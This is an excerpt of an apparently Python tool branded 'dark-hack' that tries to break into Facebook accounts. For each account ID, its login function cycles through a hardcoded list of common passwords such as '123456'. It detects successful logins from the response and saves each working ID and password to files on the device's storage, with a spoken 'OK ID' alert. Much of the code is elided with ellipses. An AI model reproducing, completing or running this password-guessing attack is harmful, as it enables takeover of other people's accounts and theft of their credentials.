...
def main():
    ...
    os.system('clear')
    print(logo)
    os.system('xdg-open https://facebook.com/groups/1135899950739892/')
...
def login(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143","1234","12345","50005000","57273200","BAngladesh","57273300","27273290"]:
            headers = {
            ...
            if "session_key" in rp:
                print(f"\r\r{G}dark-hack-OK{A}> {G}{uid} {A}•{G} {pw}")
                open("/sdcard/dark-hack-OLD-OK","a").write(uid+"|"+pw+"\n")
                os.system('espeak a-300 "OK ID"')
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}dark-hack-OK {A}> {G}{uid} {A}•{G} {pw}")
                open("/sdcard/dark-hack-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
